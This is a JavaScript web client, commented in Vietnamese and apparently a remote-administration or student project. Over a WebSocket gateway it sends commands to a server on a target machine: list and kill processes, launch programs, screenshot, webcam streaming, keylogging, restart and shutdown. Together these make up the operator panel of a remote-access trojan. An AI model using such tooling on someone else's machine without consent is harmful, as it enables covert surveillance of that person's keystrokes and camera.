/**
 * main.js - Logic điều khiển cho Web Client
 * Đảm nhiệm việc kết nối WebSocket, gửi lệnh và cập nhật giao diện
 */

let ws;
let isWebcamOn = false;

// --- 1. KHỞI TẠO KẾT NỐI WEBSOCKET ---
// Hàm này sẽ được gọi từ file HTML sau khi đã có GATEWAY_URL
function initWebSocket(gatewayUrl) {
    console.log("Đang kết nối tới:", gatewayUrl);
    logStatus("Đang kết nối tới Gateway...");
    
    ws = new WebSocket(gatewayUrl);

    ws.onopen = function() {
        logStatus("Đã kết nối thành công!");
        console.log("WebSocket Connected");
        
        // Đăng ký danh tính với Gateway: Tôi là Web Client
        // Gateway sẽ dùng role này để định tuyến tin nhắn
        ws.send(JSON.stringify({
            type: "register",
            role: "web_client"
        }));
    };

    ws.onmessage = function(event) {
        try {
            const msg = JSON.parse(event.data);
            handleServerMessage(msg);
        } catch (e) {
            console.error("Lỗi đọc dữ liệu JSON:", e);
            logStatus("Lỗi: Nhận dữ liệu không hợp lệ.");
        }
    };

    ws.onclose = function() {
        logStatus("Mất kết nối! Vui lòng tải lại trang.");
        alert("Đã mất kết nối tới Server Gateway.");
    };

    ws.onerror = function(error) {
        console.error("WebSocket Error:", error);
        logStatus("Lỗi kết nối Socket.");
    };
}

// --- 2. XỬ LÝ DỮ LIỆU NHẬN ĐƯỢC ---
function handleServerMessage(msg) {
    // msg = { type: "...", data: "..." }
    
    switch (msg.type) {
        case 'LIST_APPS':
        case 'LIST_PROCESS':
            // Xử lý dữ liệu danh sách processes/apps
            // msg.data mong đợi là mảng: [{pid: 123, name: "notepad.exe"}, ...]
            renderTable(msg.data); 
            // Tự động chuyển view sang bảng
            switchView('view-table', msg.type === 'LIST_APPS' ? 'Danh sách Ứng dụng' : 'Danh sách Tiến trình');
            break;

        case 'IMAGE_DATA':
            // Xử lý ảnh (Screenshot hoặc Webcam)
            // msg.data là chuỗi Base64
            const img = document.getElementById('monitor-img');
            if (img) {
                img.src = "data:image/jpeg;base64," + msg.data;
            }
            break;

        case 'KEY_DATA':
            // Xử lý Keylogger
            // msg.data là ký tự phím bấm
            const textArea = document.getElementById('keylog-area');
            if (textArea) {
                textArea.value += msg.data;
                // Tự động cuộn xuống dòng cuối cùng
                textArea.scrollTop = textArea.scrollHeight; 
            }
            break;
        
        case 'RESPONSE':
            // Tin nhắn phản hồi chung (ví dụ: "Command executed")
            logStatus("Server: " + msg.data);
            break;
            
        case 'ERROR':
            logStatus("Lỗi từ Server: " + msg.data);
            break;
            
        default:
            console.log("Tin nhắn không xác định:", msg);
    }
}

// --- 3. GỬI LỆNH ĐI (FUNCTIONS) ---

// Hàm gửi dữ liệu chung qua WebSocket
function sendToGateway(payload) {
    if (ws && ws.readyState === WebSocket.OPEN) {
        // QUAN TRỌNG: Luôn gắn target là 'cpp_server' để Gateway biết chuyển cho ai
        payload.target = "cpp_server";
        
        ws.send(JSON.stringify(payload));
        console.log("Đã gửi:", payload);
    } else {
        alert("Chưa kết nối tới Gateway! Vui lòng kiểm tra lại.");
    }
}

// Nút 1 & 2: Yêu cầu danh sách
function requestList(type) {
    logStatus("Đang tải danh sách...");
    sendToGateway({ action: type });
}

// Nút: Start App (Gọi từ ô input)
function startApp() {
    const appInput = document.getElementById('app-path');
    const appName = appInput.value.trim();
    
    if (appName) {
        sendToGateway({ action: 'EXECUTE', path: appName });
        logStatus("Đã gửi lệnh mở: " + appName);
        appInput.value = ''; // Xóa ô nhập sau khi gửi
    } else {
        alert("Vui lòng nhập tên ứng dụng hoặc đường dẫn!");
    }
}

// Nút: Kill Process (Gọi từ nút trong bảng)
function killProcess(target, type = 'PID') {
    // type có thể là 'PID' hoặc 'NAME'
    let actionCmd = (type === 'PID') ? 'KILL_BY_PID' : 'KILL_BY_NAME';
    
    // Hỏi xác nhận
    if (!confirm(`Bạn muốn tắt ${type}: ${target}?`)) return;

    // Gửi lệnh
    sendToGateway({ 
        action: actionCmd, 
        value: target // target là số PID hoặc chuỗi tên "chrome.exe"
    });
}

// Nút 3: Screenshot
function requestScreenshot() {
    switchView('view-media', 'Ảnh chụp màn hình');
    sendToGateway({ action: 'SCREENSHOT' });
    logStatus("Đang yêu cầu chụp màn hình...");
}

// Nút 4: Webcam Toggle
function toggleWebcam() {
    const btn = document.getElementById('btn-webcam');
    switchView('view-media', 'Webcam Trực tiếp');
    
    if (!isWebcamOn) {
        // Bật Webcam
        isWebcamOn = true;
        btn.innerText = "4. Tắt Webcam";
        btn.classList.remove('btn-info');
        btn.classList.add('btn-warning');
        
        sendToGateway({ action: 'WEBCAM_START' });
        logStatus("Đang bật Webcam...");
    } else {
        // Tắt Webcam
        isWebcamOn = false;
        btn.innerText = "4. Bật Webcam";
        btn.classList.remove('btn-warning');
        btn.classList.add('btn-info');
        
        sendToGateway({ action: 'WEBCAM_STOP' });
        logStatus("Đã gửi lệnh tắt Webcam.");
    }
}

// Nút 5: Keylog
function startKeylog() {
    switchView('view-keylog', 'Nhật ký bàn phím (Keylogger)');
    sendToGateway({ action: 'START_KEYLOG' });
    logStatus("Đang lắng nghe bàn phím...");
}

// Nút 6 & 7: Restart / Shutdown
function confirmAction(action) {
    const actionMap = { 
        'RESTART': 'Khởi động lại', 
        'SHUTDOWN': 'Tắt nguồn' 
    };
    
    const message = `CẢNH BÁO NGUY HIỂM:\nBạn có chắc chắn muốn ${actionMap[action]} máy trạm không?\nHành động này sẽ làm mất kết nối ngay lập tức.`;
    
    if (confirm(message)) {
        sendToGateway({ action: action });
        logStatus(`Đã gửi lệnh ${action}... Tạm biệt!`);
    }
}

// --- 4. CÁC HÀM HỖ TRỢ GIAO DIỆN (UI HELPERS) ---

// Chuyển đổi tab hiển thị (Table, Media, Text)
function switchView(viewId, title) {
    // Ẩn tất cả các view-section
    const sections = document.querySelectorAll('.view-section');
    sections.forEach(el => el.classList.remove('active'));
    
    // Hiện view được chọn
    const selected = document.getElementById(viewId);
    if (selected) selected.classList.add('active');
    
    // Cập nhật tiêu đề
    const titleEl = document.getElementById('view-title');
    if (titleEl) titleEl.innerText = title;
}

// Vẽ bảng HTML từ dữ liệu JSON
function renderTable(dataArray) {
    const tbody = document.getElementById('table-body');
    if (!tbody) return;
    
    tbody.innerHTML = ""; // Xóa dữ liệu cũ

    if (!Array.isArray(dataArray) || dataArray.length === 0) {
        tbody.innerHTML = "<tr><td colspan='3' style='text-align:center'>Không có dữ liệu hoặc danh sách trống</td></tr>";
        return;
    }

    dataArray.forEach(item => {
        // Tạo dòng tr
        const tr = document.createElement('tr');
        
        // Giả sử item = { pid: 1234, name: "chrome.exe" }
        // Cột ID
        const tdId = document.createElement('td');
        tdId.textContent = item.pid || "N/A";
        
        // Cột Tên
        const tdName = document.createElement('td');
        tdName.textContent = item.name || "Unknown";
        
        // Cột Hành động (Nút Kill)
        const tdAction = document.createElement('td');
        const btnKill = document.createElement('button');
        btnKill.className = 'btn-kill';
        btnKill.textContent = 'Stop/Kill';
        btnKill.onclick = function() { killProcess(item.pid); };
        
        tdAction.appendChild(btnKill);
        
        tr.appendChild(tdId);
        tr.appendChild(tdName);
        tr.appendChild(tdAction);
        
        tbody.appendChild(tr);
    });
}

// Hàm ghi log trạng thái nhỏ ở góc dưới menu
function logStatus(text) {
    const el = document.getElementById('status-log');
    if (el) {
        const time = new Date().toLocaleTimeString();
        el.innerText = `[${time}] ${text}`;
    }
}